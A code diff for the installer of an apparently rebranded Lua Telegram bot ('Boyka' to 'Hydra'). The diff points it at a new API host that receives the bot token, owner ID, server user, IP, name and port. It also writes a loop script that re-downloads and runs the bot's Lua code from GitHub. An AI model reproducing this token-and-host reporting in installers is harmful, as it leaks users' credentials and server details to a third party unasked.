@@ -32,7 +32,7 @@ if not redis:get(Server_Done.."Token_Write") then
 print('\n\27[1;41m ارسل توكن البوت الان : \n\27[0;39;49m')
 local token = io.read()
 if token ~= '' then
-data,res = https.request("https://boyka-api.ml/index.php?p="..GithubUser)
+data,res = https.request("https://Hydra-api.ml/index.php?p="..GithubUser)
 if res == 200 then
 tr = json:decode(data)
 if tr.Info.info == 'Is_Spam' then
@@ -77,13 +77,13 @@ end ---ifnot
 end
 local function Files_Info_Get()
 Create_Info(redis:get(Server_Done.."Token_Write"),redis:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://boyka-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://Hydra-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 local RunBot = io.open("Run", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
 cd $HOME/Hydra
 token="]]..redis:get(Server_Done.."Token_Write")..[["
-rm -fr BoykA.lua
+rm -fr Hydra.lua
 wget "https://raw.githubusercontent.com/hydraqi/Hydra/Hydra/Hydra.lua"
 while(true) do
 rm -fr ../.telegram-cli
@@ -117,7 +117,7 @@ else
 f:close()  
 redis:del(Server_Done.."Token_Write");redis:del(Server_Done.."UserSudo_Write")
 sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
+os.execute('./Hydra.sh ins')
 var = false
 end  
 return var
